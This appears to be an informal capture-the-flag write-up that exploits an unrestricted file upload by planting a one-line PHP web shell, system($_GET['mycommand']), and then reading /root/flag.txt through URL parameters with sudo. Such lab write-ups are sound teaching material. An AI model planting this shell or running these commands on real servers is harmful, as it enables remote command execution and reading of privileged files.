So here, the attack depends on the sanitizition of the server...
Meaning : We can see the files on the server easily using some methods like URLs...
Here what we do is that we upload a file in the website that is in a location in our Linux file system
it gets us to a page where they tell us that we made an error and uploaded a wrong file in "uploads/filename"

We in the same uploaded file path in our file system, we create a file that has a php code, in which we write this command : system($_GET['mycommand'])
system() is a command that is executed in the server directly

So next, we write that file in the URL
then at the end we write ?mycommand=sudo ls /root (from the hint)

they say that there is a file named flag.txt

we write in the URL ?mycommand=sudo cat /root/flag.txt

and the flag pops up
